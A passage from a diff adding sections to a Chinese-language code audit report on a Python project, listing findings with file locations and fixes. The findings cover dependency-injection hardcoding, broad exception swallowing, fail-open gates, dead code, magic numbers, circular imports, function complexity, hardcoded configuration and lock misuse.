+- **问题**：`_THREAD_LOCAL._span_stack`存储trace span栈（含trace_id/span_id/parent context）。`_pop_span()`仅弹出栈顶，不清空整个栈、不删除属性。线程池复用线程时，新请求会读到上一个请求残留的span栈，将其stale span误认为parent——trace上下文跨请求污染，trace树结构被破坏。与项目惯例冲突：`logging.py`和`context.py`均用`contextvars`（async安全），span_stub用`threading.local`是反模式。
+- **修复**：改为`contextvars`传播，或在请求边界清空`_span_stack`。
+
+#### 5.132.4 [LOW] event_sink的死代码thread-local（潜伏风险）
+
+- **文件**：`src/zephyr/infrastructure/system_telemetry/ai_behavior/event_sink.py:198`
+- **问题**：`_LOCAL._ai_event_stack`定义了懒初始化栈逻辑，但`_event_stack()`函数零调用，是死代码。当前无实际泄漏，但一旦未来调用必导致跨请求事件栈泄漏（既无pop也无reset）。
+- **修复**：删除死代码。
+
+**严重度汇总**：HIGH=1, MEDIUM=2, LOW=1, 合计=4
+
+---
+
+### 5.133 依赖注入硬编码（85个，第23轮新增）
+
+> **审计结论**：本维度是第23轮发现量最大的维度（85个），揭示了一个此前未审计的重大架构维度。核心问题：大量生产服务方法内部硬编码实例化外部依赖（DB连接、LLM客户端、治理引擎），而非通过构造函数注入，导致测试不可mock、耦合度高、违反"真源唯一"原则。
+
+#### 5.133.1 [HIGH] AutoRuntimeCore内8处硬编码LLM/VMS/调度器实例化
+
+- **文件**：`src/zephyr/trading/auto_runtime_core.py:272,350,365,381,392,406,426,435`
+- **问题**：`AutoRuntimeCore`是"系统大脑"，但8处方法内硬编码实例化：`DeepSeekChat(model="deepseek-v4-flash")`(350)、`OllamaChat()`(365)、`EmbeddingRouter(backend="ollama")`(381)、`LocalModelScheduler(...)`(392)、`InProcessVectorMemory()`(406)、`ModelRouter()`(426)、`ModelProfiler(max_ollama_models=5)`(435)、`TaskRepository()`(272)。所有依赖无注入入口，测试整类不可mock。`__init__`内还批量new了14个依赖（AiAuditLogger/CapabilityRegistry/NightShiftQueue/StopGate/DreamCycle/FeedbackLoop/HealthMonitor/IntegrationRegistry/WorkOrchestrator/Finalizer/LifecycleManager/ModuleOnboardingScanner/AutoIntegrator/OrphanDetector/StatusDashboard）。
+- **修复**：拆分bootstrap factory与runtime，所有外部依赖改为构造函数注入。
+
+#### 5.133.2 [HIGH] BudgetEngine跨层硬编码12处（含LLM客户端内反向耦合）
+
+- **文件**（12处）：
+  - `src/zephyr/integration/local_model/ollama_chat.py:417` — `_budget_preflight`内`BudgetEngine()`
+  - `src/zephyr/integration/local_model/deepseek_chat.py:295` — 同上
+  - `src/zephyr/trading/boot_hooks.py:439` — `_on_task_completed_budget_delta`闭包内
+  - `src/zephyr/integration/pipeline_orchestrator.py:1972` — 方法内
+  - `src/zephyr/infrastructure/governance_server.py:846` — 方法内
+  - `src/zephyr/integration/mcp/governance_server.py:842` — 同上（重复实现）
+  - `src/zephyr/governance/adversarial_tester.py:223,245,301` — 对抗测试方法内×3
+  - `src/zephyr/governance/phase_check_registry.py:498` — 门禁函数内
+  - `src/zephyr/governance/ops_governance/phase_check_registry.py:575` — 同上（重复实现）
+  - `src/zephyr/infrastructure/rollback/phase_check_registry.py:499` — 同上（三份副本）
+- **问题**：`BudgetEngine`被硬编码在12处。最严重的是LLM客户端内部硬编码治理引擎（ollama_chat/deepseek_chat），形成"治理反向耦合"——每次LLM调用都触发BudgetEngine实例化，且BudgetEngine的任何变更需修改所有LLM客户端。`phase_check_registry.py`存在三份重复实现。
+- **修复**：改为`__init__(self, budget_engine: BudgetEngineProtocol)`注入；合并三份`phase_check_registry.py`。
+
+#### 5.133.3 [HIGH] TaskRepository在方法内硬编码10处
+
+- **文件**（10处）：
+  - `src/zephyr/trading/auto_runtime_core.py:272`
+  - `src/zephyr/trading/boot_hooks.py:279,300,324,366,428` — 5个hook闭包回调各new一个
+  - `src/zephyr/trading/auto_dispatcher.py:102`
+  - `src/zephyr/trading/ide_health_daemon.py:288`
+  - `src/zephyr/trading/orchestrator/alert_handler.py:167`
+  - `src/zephyr/trading/orchestrator/finding_bridge.py:127`
+  - `src/zephyr/trading/orchestrator/batch_orchestrator.py:35`
+- **问题**：治理真源仓库`TaskRepository`在10处方法内硬编码实例化。boot_hooks的5个闭包每个事件触发都创建新实例（无状态共享、无连接复用）。
+- **修复**：改为构造函数注入或工厂注册模式。
+
+#### 5.133.4 [HIGH] psycopg2.connect绕过真源工厂直连PG（2处重复）
+
+- **文件**：
+  - `src/zephyr/infrastructure/rollback/rollback_integration.py:430`
+  - `src/zephyr/governance/rollback_integration.py:430`（重复实现）
+- **问题**：`psycopg2.connect(db_url, connect_timeout=5)`在方法内直连PG，绕过项目统一连接工厂`get_depgraph_pg_connection`（depgraph_schema.py:1196）。两份文件为完全重复实现。
+- **修复**：改为调用`get_depgraph_pg_connection`真源；合并重复实现。
+
+#### 5.133.5 [HIGH] LLM/嵌入/VMS/重排器在方法内硬编码实例化（14处）
+
+- **文件**（14处）：
+  - `src/zephyr/integration/local_model/local_model_scheduler.py:200,210` — `EmbeddingRouter()`+`OllamaChat()`
+  - `src/zephyr/integration/pipeline_orchestrator.py:1273,1292` — `EmbeddingRouter()`+`Reranker()`
+  - `src/zephyr/autonomy_core/skill_router.py:120` — `EmbeddingRouter()`
+  - `src/zephyr/ops/scheduler.py:172` — `InProcessVectorMemory()`
+  - `src/zephyr/integration/mcp/vector_memory_server.py:162` — `InProcessVectorMemory()`
+  - `src/zephyr/integration/mcp/knowledge_base_server.py:244` — `InProcessVectorMemory()`
+  - `src/zephyr/autonomy_core/context_assembler.py:594` — `Reranker(top_k=5)`
+  - `src/zephyr/integration/shared/events/dlq.py`等 — 其他散点
+- **问题**：LLM后端、嵌入路由、向量内存、重排器等重对象在方法内硬编码实例化，无DI入口。多处采用`try: from x import Y; self._z = Y() except: ...`自愈式懒初始化，彻底关闭了DI入口。
+
+#### 5.133.6 [HIGH] FeedbackLoop三份重复实现+硬编码临时目录
+
+- **文件**：
+  - `src/zephyr/governance/audit_trail/feedback_bridge.py:37`
+  - `src/zephyr/governance/audit_orchestrator/feedback_bridge.py:37`（重复实现）
+  - `src/zephyr/security/access_control/orphan_judge/feedback_bridge.py:34`（重复实现）
+- **问题**：`FeedbackLoop(Path(mkdtemp(...)))`在三份重复文件中硬编码临时目录实例化。
+
+#### 5.133.7 [MEDIUM] sqlite3.connect散点连接约35处（无连接池/无工厂注入）
+
+- **文件**（约35处，含重复实现）：
+  - `behavioral_audit/trend_analyzer.py:98,217`、`tamper_proof_audit.py:131,142,164`、`gate_persistence.py:61,196,217`、`correlation_engine.py:67,110`、`dashboard.py:79,102`、`cold_start.py:185`、`drift_result_types.py:453`
+  - `infrastructure/capacity_assurance/schema.py:62,157,180,275,329`、`risk_mitigation.py:37,49,223`、`tech_stack.py:143`
+  - `integration/shared/events/dlq.py:184,217,286,302,317,333,368`
+  - `infrastructure/rollback/sqlite_dumper.py:157,166,179,293`、`rollback_verifier.py:141,190,191`
+  - `infrastructure/event_store.py:137`、`infrastructure/cost_tracker.py:137`
+  - `shared/session_continuity.py:133`
+  - `autonomy_core/system_snapshot.py:268`、`support/system_snapshot.py:267`（重复实现）
+  - `behavioral_audit/drift_engine.py:507`
+- **问题**：约35处`sqlite3.connect()`在业务方法内（非`__init__`、非工厂函数），每个方法各开各的连接，无连接池、无connection_factory注入，DB层完全不可mock。与项目已建立的PG连接工厂模式（`get_depgraph_pg_connection`）形成鲜明对比——PG侧有真源，sqlite侧无真源。
+- **修复**：建立sqlite3连接工厂真源（类似`get_depgraph_pg_connection`），收拢散点连接。
+
+#### 5.133.8 [MEDIUM] EmbeddingRouter在__init__和方法内散点实例化（5处）
+
+- **文件**：
+  - `src/zephyr/integration/vector_memory/in_process_vector_memory.py:66` — `__init__`内
+  - 其他4处见5.133.5
+- **问题**：`EmbeddingRouter`在5处散点实例化，部分在`__init__`内（组合但严格DI视角仍应注入），部分在方法内（自愈式懒初始化）。
+
+#### 5.133.9 [LOW] 轻量值对象/组合根/单例工厂（8处，信息性记录）
+
+- **文件**：
+  - `shared/security/capability.py:216` — `capability_check()` helper内`CapabilityRegistry()`，可接受
+  - `shared/observability_02/health.py:257` + `ops/observability/health.py:257` — `collect_health()`内`LifecycleManager()`（重复实现）
+  - `trading/finalizer.py:103` — `get_finalizer()`懒单例工厂，合法模式
+  - `frontend/dashboard/app.py:170` — `TaskRepository()`传给`create_app()`，组合根
+  - `trading/autopilot.py:54`、`conductor.py:73` — `TaskRepository(self._db_path, enable_gate=False)`在`__init__`内
+  - `integration/pipeline_orchestrator.py:235` — `ModelProfiler()`在`__init__`内
+- **问题**：这些属于轻量值对象实例化或合法组合根模式，严格DI视角应注入但生命周期一致，优先级LOW。
+
+**严重度汇总**：HIGH=37, MEDIUM=40, LOW=8, 合计=85
+
+---
+
+### 5.134 返回值不一致（2个，第24轮新增）
+
+#### 5.134.1 [MEDIUM] _hash_file类型注解与实际返回不匹配
+
+- **文件**：`src/zephyr/behavioral_audit/baseline_manager.py:119`
+- **问题**：函数签名标注`-> str | None`，但实际始终返回`str`（`hashlib.sha256(...).hexdigest()`）。若文件打开失败会抛异常而非返回None。注解错误，应为`str`。对比：`detector_dispatcher.py:44`的`_compute_file_hash`注解正确为`-> str`。
+
+#### 5.134.2 [LOW] auto_kill_on_errors使用未导入的Optional
+
+- **文件**：`src/zephyr/autonomy_core/skill_kill_switch.py:70`
+- **问题**：返回类型注解`Optional[dict[str, Any]]`，但文件仅`from typing import Any`未导入`Optional`。因有`from __future__ import annotations`注解延迟求值，运行时不报错；但`typing.get_type_hints()`求值会触发`NameError`。
+
+**严重度汇总**：HIGH=0, MEDIUM=1, LOW=1, 合计=2
+
+---
+
+### 5.135 异常粒度过粗（697个，第24轮新增）
+
+> **审计结论**：本维度是第24轮发现量最大的维度（697个），揭示了一个系统性架构债务。全项目存在697处`except Exception`吞没异常的违规，分布在5种模式中。项目无`except BaseException`或裸`except:`吞没异常（HIGH=0），但MEDIUM级违规大量存在。
+
+#### 5.135.1 [MEDIUM] except Exception: pass 静默吞没异常（205处）
+
+- **文件**：100+个文件，205处
+- **问题**：宽泛except后直接`pass`，既不记录日志也不re-raise，完全隐藏异常。高频文件：`trading/auto_runtime_core.py`(7处)、`trading/resource_optimization.py`(8处)、`integration/pipeline_orchestrator.py`(12处)、`security/llm_defense/llm_security/runtime_interceptor.py`(8处)。
+- **修复**：对shutdown/cleanup上下文的`pass`可保留但增加`logger.debug`；对业务逻辑的`pass`应改为`logger.error + raise`或细化异常类型。
+
+#### 5.135.2 [MEDIUM] except Exception: continue 静默跳过（96处）
+
+- **文件**：59个文件，96处
+- **问题**：宽泛except后`continue`跳过当前循环迭代，不记录日志、不re-raise。高频文件：`behavioral_audit/drift_result_types.py`(11处)和`governance/drift_detection/drift_result_types.py`(11处)为重复实现，合计22处。
+
+#### 5.135.3 [MEDIUM] except Exception: return GateResult.YELLOW 静默fail-open（76处）
+
+- **文件**：
+  - `governance/phase_check_registry.py`（25处）
+  - `governance/ops_governance/phase_check_registry.py`（26处，重复实现）
+  - `infrastructure/rollback/phase_check_registry.py`（25处，三份副本）
+- **问题**：**最危险的违规模式**——治理门禁在异常时静默fail-open（返回YELLOW放行），可能放行本应阻断的提交。三份`phase_check_registry.py`完全重复，合计76处。当phase check内部抛异常（YAML解析失败/DB连接断/代码bug），门禁不阻断，直接返回YELLOW。
+- **修复**：合并三份副本为单一真源；将fail-open改为fail-closed（`return GateResult.RED`）或`logger.error + raise`。
+
+#### 5.135.4 [MEDIUM] except Exception: return False/None/[]/{}/"" 静默返回空值（141处）
+
+- **文件**：100+个文件，141处
+- **问题**：宽泛except后返回空值/假值，调用方无法区分"正常无结果"和"内部异常"。代表性文件：`behavioral_audit/reconciler.py`(4处)、`governance/behavioral_admission/gpu_consensus_scheduler.py`(3处)、`infrastructure/rollback/sqlite_dumper.py`(3处)。
+
+#### 5.135.5 [MEDIUM] except Exception: return True, "" 显式fail-open（4处）
+
+- **文件**：
+  - `governance/commit_gates/create_guard.py:93,124`
+  - `governance/commit_gates/capability_overlap_gate.py`（2处）
+- **问题**：提交门禁异常时返回"通过"结果，代码注释显式声明`# fail-open`。虽为有意设计，但违反"门禁应fail-closed"原则，应至少记录`logger.error`告警。
+
+#### 5.135.6 [LOW] except Exception + logger 但仍吞没异常（约175处）
+
+- **文件**：100+个文件，约175处（220处logger匹配中扣除约25% re-raise后）
+- **问题**：`except Exception as e: logger.warning(...); return`模式——至少记录了日志（比MEDIUM好），但仍是吞没异常。高频文件：`trading/boot_hooks.py`(30处)、`trading/auto_runtime_core.py`(10处)、`ops/scheduler.py`(8处)。
+- **修复**：升级为`logger.error + raise`或至少`logger.exception`（保留完整traceback）。
+
+**严重度汇总**：HIGH=0, MEDIUM=522, LOW=175, 合计=697
+
+---
+
+### 5.136 死代码检测（11个，第24轮新增）
+
+#### 5.136.1 [MEDIUM] MIGRATED注释代码块+__all__引用幽灵符号（7处）
+
+- **文件**：
+  - `risk/__init__.py:59-83`（25行注释代码块）
+  - `risk/cross_asset/currency_hedger_and_fixed_income/__init__.py:57-79`（23行，且`__all__`引用18个未导入符号）
+  - `risk/cross_asset/cross_asset_risk_decomposer/__init__.py:25-41`（17行，且`__all__`引用11个未导入符号）
+  - `risk/implementations/__init__.py:25-40`（16行）
+  - `governance/compliance_gate_a6/__init__.py:21-26`（6行）
+  - `governance/performance_attribution_engine/__init__.py:51-56`（6行，且`__all__`引用4个未导入符号）
+  - `infrastructure/script_system/__init__.py:19-20`（2行，且`__all__`引用未导入的GateBridge/KBBridge）
+- **问题**：TC-7-2重构后遗留的`# MIGRATED: ... removed by TC-7-2`注释代码块，迁移历史已在git中保存，注释属冗余死代码。多个文件的`__all__`仍列出已不存在的符号，会导致`from package import *`抛`ImportError`。
+- **修复**：删除注释代码块，同时修复`__all__`幽灵符号——要么恢复import，要么从`__all__`中移除。
+
+#### 5.136.2 [MEDIUM] 迁移示例占位注释代码块
+
+- **文件**：`shared/utils/migration.py:99-113`（15行）
+- **问题**：标注"Phase 5占位"的注释代码示例，已有意识保留但应改为docstring形式。
+
+#### 5.136.3 [LOW] 未使用import（2处）
+
+- **文件**：
+  - `security/llm_defense/llm_security/patterns/__init__.py:20` — `from typing import Any, Dict, List, Optional`全未使用
+  - `src/zephyr/__init__.py:30` — `Optional`未使用
+
+#### 5.136.4 [LOW] 未使用变量
+
+- **文件**：`behavioral_audit/alert_router.py:82` — `parts = drift_dimension.split("_")`赋值后从未读取。
+
+**严重度汇总**：HIGH=0, MEDIUM=8, LOW=3, 合计=11
+
+---
+
+### 5.137 魔数检测（20个，第24轮新增）
+
+#### 5.137.1 [HIGH] 安全/超时/重试/容量限制魔数（10处）
+
+- **文件**（10处代表性问题）：
+  - `trading/orchestrator/core/task_queue.py:165` — `max_size=1000, priority_levels=3, timeout=300, retry_limit=3`单行4个魔数
+  - `trading/verdict_engine.py:374,376` — `if session_violation_count >= 5: return L5` / `>= 3: return L4`决策升级阈值
+  - `trading/health_monitor.py:277-281` — 内存压力分级`> 90/80/70`
+  - `trading/boot_hooks.py:306` — `if retry_count < 3`自动重试门限
+  - `infrastructure/rollback/rollback_integration.py:380,382` — `token_rate > 5000/10000`checkpoint密度阈值
+  - `trading/auto_runtime_core.py:226-227` — `range(10), sleep(2.5)` ollama启动轮询
+  - `ops/scheduler.py:246` — `time.sleep(300)`调度器空转5分钟
+  - `trading/session_lifecycle.py:486,488` — `timeout=10.0, busy_timeout=5000` SQLite双超时
+  - `behavioral_audit/brain_integration.py:242,291,335,370` — 超时值60/120随机切换
+  - `rollback_integration.py:446`（两份重复）— `time.sleep(2**attempt)`指数退避无上限
+- **系统性问题**：`ThreadPoolExecutor(max_workers=8)`散布于20+文件，`timeout=10/30/60`三档值随机混用。
+
+#### 5.137.2 [MEDIUM] 业务逻辑魔数（10处）
+
+- **文件**（10处代表性问题）：
+  - `governance/index_generator.py:133-139` + `infrastructure/asset_inventory/index_generator.py:131-137`（重复）— `>= 90/75/55/35`评分→等级映射
+  - `autonomy_core/skill_model_evolution.py:179-185` — `>= 90/70/50/30`风险分级
+  - `governance/risk_matrix.py:58-62` — `>= 20/12/6`风险评分
+  - `autonomy_core/phase_planner.py:151-155` — `<= 6/13/25`阶段阈值
+  - `trading/gpu_consensus_scheduler.py` — 共识置信度`0.95/0.6/0.7/0.8/0.5/0.0`散布8处
+  - `governance/triage.py:286-290` — `> 500/200/100` body长度分流
+  - `governance/conversation_tax_detector.py:115-117` + `trading/speed_baseline_checker.py:139` — `> 600/300`会话间隔
+  - `autonomy_core/skill_executor.py:230,363` — `>= 5/70`技能质量门禁
+  - `infrastructure/system_telemetry/contract_metrics.py:122` — `< 95` SLO通过率
+  - `trading/auto_runtime_core.py:562` — `>= 50`计数阈值
+
+**严重度汇总**：HIGH=10, MEDIUM=10, LOW=0, 合计=20
+
+---
+
+### 5.138 循环引用风险（15个，第24轮新增）
+
+#### 5.138.1 [HIGH] 显式确认的循环import（7处）
+
+- **文件**（7处）：
+  - `src/zephyr/__init__.py:115-127,133-144` — 两处`threading.Timer`延迟import规避循环（`auto_bootstrap`和`_service_registration`），注释明确写"避免循环导入"，用`except Exception: pass`静默吞错
+  - `trading/resource_optimization.py:25-26` — 模型拆分规避`shared.io/shared.infra → models → shared.io/shared.infra`间接循环
+  - `behavioral_audit/drift_result_types.py:1354-1356` — 函数内延迟import规避`drift_result_types ↔ drift_engine`包内循环
+  - `infrastructure/a2a_protocol/__init__.py:61-63` — PEP 562 `__getattr__`规避循环
+  - `infrastructure/a2a_protocol/layer2_communication/__init__.py:40-57` — PEP 562 `_LAZY_IMPORTS`规避循环
+  - `autonomy_core/context_budget_tracker.py:142`（及management副本）— `TYPE_CHECKING`规避`DocCompressor`循环
+- **问题**：7处循环import已确认存在，当前靠Timer线程/PEP 562/TYPE_CHECKING等workaround规避。`zephyr/__init__.py`的Timer hack最脆弱——注册失败被`except Exception: pass`完全静默。
+
+#### 5.138.2 [MEDIUM] 延迟import暗示循环风险/容错吞错（6处）
+
+- **文件**（6处）：
+  - `trading/verdict_engine.py:30-37` — `try/except ImportError`容错`governance.audit_trail.models`
+  - `behavioral_audit/drift_engine.py:71-89` — `try/except ImportError`容错14个符号
+  - `behavioral_audit/drift_hotfix_bypass.py:47-52` — 核心协议`AuditWriterProtocol`容错
+  - `autonomy_core/engine.py:43-49` — 审计写入器容错，`_AUDIT_AVAILABLE = False`降级致审计静默失效
+  - `governance/audit_orchestrator/bridge.py:36-76` — 6连`try/except Exception`桥接，`except Exception`过宽吞真实Bug
+  - `trading/boot_hooks.py:73-528` — 26处延迟import，`governance.task_repo`重复延迟7次
+- **问题**：`governance.audit_trail`被4处不同文件用try/except容错——审计链是H级安全功能，静默降级违反不变式。
+
+#### 5.138.3 [LOW] 合理的延迟import模式（2处，信息性记录）
+
+- `behavioral_audit/__init__.py:295-318` — PEP 562合理懒加载（256符号映射），非循环规避
+- `trading/auto_runtime_core.py:31-40` — TYPE_CHECKING标准循环规避做法（合规）
+
+**严重度汇总**：HIGH=7, MEDIUM=6, LOW=2, 合计=15
+
+---
+
+### 5.139 TODO/FIXME技术债务标记（1个，第24轮新增）
+
+> **审计结论**：本维度**仅发现1处真实技术债务标记**，代码库在该维度极为清洁。全量搜索TODO/FIXME/HACK/XXX/WORKAROUND/TEMP共63处匹配，但62处为误报（混沌注入器的"伪TODO地雷"、检测器检测模式、配置模板占位符、领域术语P-Hacking等）。项目对技术债务标记有主动检测与拦截机制。
+
+#### 5.139.1 [LOW] boot_hooks.py的TODO待办（已关联工单）
+
+- **文件**：`trading/boot_hooks.py:88`
+- **问题**：`# TODO DM-201247: 当 HealthMonitor 分钟级调度就绪后接入`——AggregateHealth的接入被显式延迟。已关联工单DM-201247，属于"已跟踪的延迟集成项"，治理状态良好。
+- **修复**：待HealthMonitor实现分钟级调度后接入。
+
+**严重度汇总**：HIGH=0, MEDIUM=0, LOW=1, 合计=1
+
+---
+
+### 5.140 函数复杂度过高（15个，第24轮新增）
+
+#### 5.140.1 [HIGH] pipeline_orchestrator.dispatch 461行/7层嵌套/30+分支
+
+- **文件**：`src/zephyr/integration/pipeline_orchestrator.py:375-836`
+- **问题**：`dispatch`方法同时触犯三项阈值：461行、嵌套7层、30+分支。包含幂等性检查、RBAC校验、CT-PIPE路由、模型路由、令牌预算、管线锁、G6合规、技能注入、逐模块执行、Claude救援、模型崩塌检测等十余个职责揉在一起。第660-662行skill_feedback区段达7层嵌套。
+- **修复**：按职责抽取为`_check_idempotency`、`_handle_rollback_exit`、`_check_rbac`、`_resolve_pipeline_modules`、`_execute_modules_loop`、`_finalize_dispatch`等子方法。
+
+#### 5.140.2 [MEDIUM] 100-200行或嵌套4-5层的函数（9处）
+
+- **文件**（9处）：
+  - `integration/pipeline_orchestrator.py:1361` — `_call_model` 153行/3层/~10分支
+  - `ops/evolution_engine.py:192` — `evolve` 149行/4层/~12分支（L1/L2/L3三层反馈揉在一起）
+  - `governance/reconciler.py:61` — `reconcile` 142行/3层/~10分支
+  - `shared/session_continuity.py:321` — `_generate_and_save_legacy` 137行/5层/~9分支
+  - `trading/verdict_engine.py:169` — `evaluate` 126行/4层/10+分支（4种事件类型分派）
+  - `trading/orchestrator/agent_orchestrator.py:719` — `orchestrate` 117行/3层/~8分支
+  - `ops/scheduler.py:327` — `_run_once` 107行/4层/~10分支（FLE管线5阶段串联）
+  - `integration/pipeline_orchestrator.py:1169` — `_execute_module` 99行/4层/~8分支
+  - `integration/pipeline_orchestrator.py:2300` — `_check_g6_blueprint_compliance` 81行/5层/~7分支
+
+#### 5.140.3 [LOW] 50-100行函数（5处）
+
+- **文件**（5处）：
+  - `integration/llm_gateway.py:255` — `_call_anthropic` 88行
+  - `governance/kb/ingest.py:105` — `ingest` 88行
+  - `governance/self_healer.py:153` — `heal` 85行
+  - `trading/orchestrator/chaos_engine.py:130` — `inject` 77行
+  - `integration/llm_gateway.py:182` — `_call_openai_compatible` 73行
+
+**严重度汇总**：HIGH=1, MEDIUM=9, LOW=5, 合计=15
+
+---
+
+### 5.141 配置硬编码vs外部化（20个，第24轮新增）
+
+#### 5.141.1 [HIGH] 硬编码URL/端点/模型名（14处代表性问题）
+
+- **文件**（14处）：
+  - `integration/local_model/ollama_chat.py:40` + 3处重复 — `DEFAULT_OLLAMA_URL = "http://localhost:11434"`
+  - `integration/local_model/deepseek_chat.py:47` + 2处重复 — `DEFAULT_BASE_URL = "https://api.deepseek.com/v1"`
+  - `integration/local_model/ollama_chat.py:42` — `INFERENCE_MODEL = "qwen3:8b"`；`ollama_embedding.py:49` — `model: str = "BGE-M3:latest"`；`deepseek_chat.py:48` — `DEFAULT_MODEL = "deepseek-v4-flash"`
+  - `trading/auto_runtime_core.py:350` — `DeepSeekChat(model="deepseek-v4-flash")`业务代码直接硬编码模型名
+  - `trading/gpu_consensus_scheduler.py:159-166` + governance重复副本 — URL+模型名+超时混合硬编码7个参数
+  - `integration/model_router.py:70-72` + infrastructure/pipeline重复副本 — `{"deepseek": "deepseek-v4-pro", "glm": "glm-5.1", "claude": "claude-opus-4.7"}`模型版本映射
+  - `governance/secret_rotation_aware.py:60-65` + infrastructure/rollback重复副本 — 密钥轮换端点URL硬编码
+  - `trading/orchestrator/model_registry.py:22-27` + governance/audit_orchestration重复副本 — 模型token_limit硬编码
+  - `ops/security/dep_cve_correlator.py:53` — NVD API URL硬编码
+  - `ops/config.py:25` + 3处 — `otel_endpoint = "http://localhost:4317"`无env兜底（注：`ops/observability/tracing.py:81`已正确使用`os.environ.get`）
+  - `shared/contracts/runtime_types.py:69` — pydantic契约字段携带部署默认值
+  - `shared/foundation/flags.py:127,129` — feature flag中硬编码`model = "gpt-4o"`
+  - `infrastructure/pipeline/pipeline_roadmap.py:682-683` — `m3_model = "deepseek-v4-pro"`、`m7_model = "glm-5.1"`
+  - `governance/cost_router.py:30-32` — `GLM4_7 = "glm-4.7"`等模型版本枚举硬编码
+- **正面范例**：`llm_gateway.py`已采用`os.getenv("DEEPSEEK_BASE_URL", ...)`模式，应作为统一标准推广。
+
+#### 5.141.2 [MEDIUM] 硬编码路径/超时值（4处代表性问题）
+
+- **文件**（4处）：
+  - `trading/session_lifecycle.py:38`等 — `Path("data/behavioral-admission")`等数据目录路径硬编码（绕过`shared/io/paths.py` SSoT）
+  - `behavioral_audit/drift_engine.py:503`等 — `"data/databases/governance.db"`数据库路径散点硬编码（绕过`DB_PATH` SSoT）
+  - `infrastructure/auto_fix_engine/fix_safety.py:167,183,201`等 — `timeout=120/120/60`散落硬编码
+  - `integration/dead_letter_queue.py:32` + 重复副本 — `max_retries=3`硬编码
+
+#### 5.141.3 [LOW] 合理默认值但仍建议外部化（2处）
+
+- `integration/local_model/ollama_chat.py:43-45` + deepseek_chat重复 — `INFERENCE_TEMPERATURE = 0.1`、`INFERENCE_MAX_TOKENS = 1024`、`INFERENCE_TIMEOUT_S = 60.0`
+- `governance/integration_hub.py:91,102,113` — `max_tokens=400/800/2000`三级token预算
+
+**严重度汇总**：HIGH=14, MEDIUM=4, LOW=2, 合计=20
+
+---
+
+### 5.142 并发原语正确性（8个，第25轮新增）
+
+审查 Lock/RLock/Event/Semaphore/Condition 使用错误、潜在死锁、锁粒度过大、锁未释放、双重加锁等问题。
+
+#### 5.142.1 [MEDIUM] pipeline锁双重释放+成功后误转FAILED
+
+- [integration/pipeline_orchestrator.py:732,821](file:///D:/ZephyrAlpha/src/zephyr/integration/pipeline_orchestrator.py#L732)
+- 锁释放散落在try体内(732)与except块(821)而非finally。732释放后到767 return间多个调用点可抛异常，except块对已释放锁再次release(双重释放)，并将实际已成功的pipeline误转为TaskStatus.FAILED
+- 修复：将`_release_pipeline_lock`移入`finally`块，用标志位避免重复释放
+
+#### 5.142.2 [MEDIUM] `_waited`计数器在锁外自增（数据竞争）
+
+- [infrastructure/rate_limiter.py:122](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/rate_limiter.py#L122)
+- `_acquired`/`_rejected`/`_tokens`均在`with self._lock`内修改，唯独`self._waited += 1`在锁外。`+=`是LOAD-ADD-STORE三步非原子；`stats()`在锁内读取`_waited`，构成读-写竞争
+- 修复：将`self._waited += 1`移入`with self._lock`块
+
+#### 5.142.3 [MEDIUM] `WorkOrchestrator._dags`字典完全无锁保护
+
+- [trading/work_orchestrator.py:59-80](file:///D:/ZephyrAlpha/src/zephyr/trading/work_orchestrator.py#L59)
+- 同类中`self._items`受`self._lock`保护，而`self._dags`的读/写/迭代均无锁。`load_dags`(写入)与`list_dags`(`list(self._dags.values())`迭代)并发会抛`RuntimeError: dictionary changed size during iteration`
+- 修复：所有`_dags`访问统一用`with self._lock`包裹
+
+#### 5.142.4 [MEDIUM] 夜班队列`_next_id`在锁外自增（可产生重复ID）
+
+- [trading/night_shift_queue.py:68-78](file:///D:/ZephyrAlpha/src/zephyr/trading/night_shift_queue.py#L68)
+- `_next_id()`在`with self._lock`(75行)之前被调用，`self._counter += 1`完全裸露。两线程并发append时可同时读到相同counter值，生成重复`NSL-XXXX` ID
+- 修复：将`_next_id()`调用移入`with self._lock`块内
+
+#### 5.142.5 [LOW] async方法内使用threading.Lock
+
+- [trading/gpu_consensus_scheduler.py:194-217](file:///D:/ZephyrAlpha/src/zephyr/trading/gpu_consensus_scheduler.py#L194)
+- `async def submit`中使用`with self._lock`(threading.Lock)。单线程事件循环下形同虚设，若未来引入线程池会阻塞整个事件循环
+- 修复：改用`asyncio.Lock`+`async with`
+
+#### 5.142.6 [LOW] 生命周期布尔标志无锁访问（start/stop TOCTOU）
+
+- [trading/health_monitor.py:316-328](file:///D:/ZephyrAlpha/src/zephyr/trading/health_monitor.py#L316) + 4个同类文件
+- `_running`/`_started`布尔标志在start()/stop()/_loop()间无锁访问。start()的check-then-act是TOCTOU——两线程同时调用可都读到`_running=False`，启动两个线程
+- 修复：用`with self._lock`包裹或改为`threading.Event`
+
+#### 5.142.7 [LOW] SQLite访问锁粒度过大（串行化抵消WAL并发收益）
+
+- [infrastructure/event_store.py:155-166](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/event_store.py#L155) + cost_tracker.py
+- 每次调用新建连接+SQLite已配置WAL+`connect(timeout=10)`自带忙等待锁，但`self._lock`将"建连接+执行+提交+关闭"整体串行化，使WAL并发收益归零
+- 修复：移除`self._lock`依赖SQLite timeout+WAL，或使用线程局部连接
+
+#### 5.142.8 [LOW] TaskQueue._stats字典后台线程写、属性读无锁
+
+- [trading/orchestrator/core/task_queue.py:117-130](file:///D:/ZephyrAlpha/src/zephyr/trading/orchestrator/core/task_queue.py#L117)
+- `_stats`在后台`_loop`线程中`+= 1`(非原子)，在`stats`属性中`dict(self._stats)`迭代拷贝。并发读写可读到半更新值
+- 修复：`stats`属性读取与`_loop`写入统一用`threading.Lock`保护
+
+**N/A维度**：Event.wait无超时永久阻塞(所有调用均带timeout)、Semaphore释放>获取(无Semaphore使用)、Condition.notify未持锁(无Condition使用)、多锁顺序不一致(无嵌套加锁)、Thread无daemon也无join(全部18处Thread均daemon=True)
+
+**严重度汇总**：HIGH=0, MEDIUM=4, LOW=4, 合计=8
+
+---
+
+### 5.143 API契约一致性（22个，第25轮新增）
+
+审查接口定义与实现不匹配、抽象方法未实现、Protocol未遵守、参数签名漂移、返回值契约违反、LSP违规、SSoT重复与注册表分裂等问题。
+
+#### 5.143.1 [HIGH] generate_target_weights基类与子类签名完全脱钩（LSP违规）
+
+- 基类：[governance/strategy_base.py:74-79](file:///D:/ZephyrAlpha/src/zephyr/governance/strategy_base.py#L74) — `def generate_target_weights(self, universe, signals, constraints) -> dict[str, float]`
